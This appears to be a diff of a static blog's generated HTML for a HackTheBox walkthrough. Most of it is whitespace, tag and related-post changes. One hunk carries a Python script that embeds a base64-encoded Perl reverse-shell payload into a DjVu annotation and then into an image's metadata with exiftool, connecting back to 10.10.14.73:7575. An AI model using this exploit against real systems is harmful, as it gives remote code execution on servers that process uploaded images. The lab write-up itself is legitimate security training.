@@ -1148,8 +1148,8 @@
 24
 </pre></td><td class="rouge-code"><pre><span class="c1">#!/bin/env python3
 </span>
-<span class="kn">import</span> <span class="nn">base64</span>
-<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">subprocess</span>
 
 <span class="n">ip</span> <span class="o">=</span> <span class="s">'10.10.14.73'</span>
 <span class="n">port</span> <span class="o">=</span> <span class="s">'7575'</span>
@@ -1157,19 +1157,19 @@
 <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"(metadata </span><span class="se">\"</span><span class="s">\c${use MIME::Base64;eval(decode_base64('"</span>
 
 
-<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span> <span class="sa">f</span><span class="s">"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">,inet_aton('</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">'))));"</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span> <span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span> <span class="sa">f</span><span class="s">"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">,inet_aton('</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">'))));"</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span> <span class="p">)</span>
 
 <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"'))};</span><span class="se">\"</span><span class="s">)"</span>
 
 
-<span class="n">payload_file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'payload'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span>
-<span class="n">payload_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
-<span class="n">payload_file</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">payload_file</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">'payload'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span>
+<span class="n">payload_file</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+<span class="n">payload_file</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 
 
-<span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">([</span><span class="s">'bzz'</span><span class="p">,</span> <span class="s">'payload'</span><span class="p">,</span> <span class="s">'payload.bzz'</span><span class="p">])</span>
-<span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">([</span><span class="s">'djvumake'</span><span class="p">,</span> <span class="s">'exploit.djvu'</span><span class="p">,</span> <span class="s">"INFO=1,1"</span><span class="p">,</span> <span class="s">'BGjp=/dev/null'</span><span class="p">,</span> <span class="s">'ANTz=payload.bzz'</span><span class="p">])</span>
-<span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">([</span><span class="s">'exiftool'</span><span class="p">,</span> <span class="s">'-config'</span><span class="p">,</span> <span class="s">'configfile'</span><span class="p">,</span> <span class="s">'-HasselbladExif&lt;=exploit.djvu'</span><span class="p">,</span> <span class="s">'image.jpg'</span><span class="p">])</span>
+<span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="s">'bzz'</span><span class="p">,</span> <span class="s">'payload'</span><span class="p">,</span> <span class="s">'payload.bzz'</span><span class="p">])</span>
+<span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="s">'djvumake'</span><span class="p">,</span> <span class="s">'exploit.djvu'</span><span class="p">,</span> <span class="s">"INFO=1,1"</span><span class="p">,</span> <span class="s">'BGjp=/dev/null'</span><span class="p">,</span> <span class="s">'ANTz=payload.bzz'</span><span class="p">])</span>
+<span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="s">'exiftool'</span><span class="p">,</span> <span class="s">'-config'</span><span class="p">,</span> <span class="s">'configfile'</span><span class="p">,</span> <span class="s">'-HasselbladExif&lt;=exploit.djvu'</span><span class="p">,</span> <span class="s">'image.jpg'</span><span class="p">])</span>
 </pre></td></tr></tbody></table></code></div></div>
 
 <p>Running the script the image is getting updated with the payload.</p>
@@ -1789,6 +1789,493 @@ dynamic_prompt<span class="o">()</span> <span class="o">{</span>
     
     
     
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
   
     
     
@@ -1847,62 +2334,15 @@ dynamic_prompt<span class="o">()</span> <span class="o">{</span>
     
     
     
-      
-        
-        
-
   
     
     
     
     
-      
-    
   
     
     
     
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -1931,194 +2371,9 @@ dynamic_prompt<span class="o">()</span> <span class="o">{</span>
     
     
       
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
         
         
 
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
   
     
     
@@ -2143,34 +2398,34 @@ dynamic_prompt<span class="o">()</span> <span class="o">{</span>
 
     
       
+      <a class="post-tag" href="/tags/hacking/">Hacking</a>
+    
+      
+      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
+    
+      
+      <a class="post-tag" href="/tags/machine/">Machine</a>
+    
+      
+      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
+    
+      
+      <a class="post-tag" href="/tags/medium/">Medium</a>
+    
+      
       <a class="post-tag" href="/tags/linux/">linux</a>
     
       
       <a class="post-tag" href="/tags/cve/">cve</a>
     
       
+      <a class="post-tag" href="/tags/easy/">Easy</a>
+    
+      
       <a class="post-tag" href="/tags/c/">c</a>
     
       
       <a class="post-tag" href="/tags/chroot/">chroot</a>
-    
-      
-      <a class="post-tag" href="/tags/coding/">coding</a>
-    
-      
-      <a class="post-tag" href="/tags/easy/">easy</a>
-    
-      
-      <a class="post-tag" href="/tags/exfitool/">exfitool</a>
-    
-      
-      <a class="post-tag" href="/tags/hashcat/">hashcat</a>
-    
-      
-      <a class="post-tag" href="/tags/imagemagick/">imagemagick</a>
-    
-      
-      <a class="post-tag" href="/tags/insane/">insane</a>
     
 
     </div>
@@ -2280,6 +2535,136 @@ dynamic_prompt<span class="o">()</span> <span class="o">{</span>
   
 
   
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
     
 
 
@@ -2290,16 +2675,6 @@ dynamic_prompt<span class="o">()</span> <span class="o">{</span>
 <!-- Fill with the other newlest posts  -->
 
 
-
-  
-    
-    
-      
-      
-        
-        
-        
-          
 
 
 
@@ -2386,7 +2761,7 @@ Paper is an easy rated machine on HackTheBox created by secnigma. For the user p
       
       
       <div class="card">
-        <a href="/posts/htb-Squashed/">
+        <a href="/posts/HackTheBox-Walkthrough-Investigation/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -2398,13 +2773,13 @@ Paper is an easy rated machine on HackTheBox created by secnigma. For the user p
 
 
 <em class="small"
-    data-ts="1669305600"
+    data-ts="1682092800"
     data-df="ll"
     >
-  Nov 25, 2022
+  Apr 22, 2023
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Squashead - Hack The Box</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Investigation</h3>
             <div class="text-muted small">
               <p>
                 
@@ -2413,8 +2788,11 @@ Paper is an easy rated machine on HackTheBox created by secnigma. For the user p
 
 
 
-                Squashed is an Easy Difficulty Linux machine that features a combination of both identifying and leveraging
-misconfigurations in NFS shares through impersonating users. Additionally, the box incorp...
+                In this machine, I had to exploit a known vulnerability in exiftool, find a password in some logs, and finally reverse a program to find how to exploit it.
+
+
+  Room: Investigation
+  Difficulty: Med...
               </p>
             </div>
           </div>
@@ -2522,6 +2900,493 @@ misconfigurations in NFS shares through impersonating users. Additionally, the b
     
     
     
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
   
     
     
@@ -2580,62 +3445,15 @@ misconfigurations in NFS shares through impersonating users. Additionally, the b
     
     
     
-      
-        
-        
-
   
     
     
     
     
-      
-    
   
     
     
     
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -2664,194 +3482,9 @@ misconfigurations in NFS shares through impersonating users. Additionally, the b
     
     
       
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
         
         
 
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
   
     
     
@@ -2876,34 +3509,34 @@ misconfigurations in NFS shares through impersonating users. Additionally, the b
 
     
       
+      <a class="post-tag" href="/tags/hacking/">Hacking</a>
+    
+      
+      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
+    
+      
+      <a class="post-tag" href="/tags/machine/">Machine</a>
+    
+      
+      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
+    
+      
+      <a class="post-tag" href="/tags/medium/">Medium</a>
+    
+      
       <a class="post-tag" href="/tags/linux/">linux</a>
     
       
       <a class="post-tag" href="/tags/cve/">cve</a>
     
       
+      <a class="post-tag" href="/tags/easy/">Easy</a>
+    
+      
       <a class="post-tag" href="/tags/c/">c</a>
     
       
       <a class="post-tag" href="/tags/chroot/">chroot</a>
-    
-      
-      <a class="post-tag" href="/tags/coding/">coding</a>
-    
-      
-      <a class="post-tag" href="/tags/easy/">easy</a>
-    
-      
-      <a class="post-tag" href="/tags/exfitool/">exfitool</a>
-    
-      
-      <a class="post-tag" href="/tags/hashcat/">hashcat</a>
-    
-      
-      <a class="post-tag" href="/tags/imagemagick/">imagemagick</a>
-    
-      
-      <a class="post-tag" href="/tags/insane/">insane</a>
     
 
     </div>
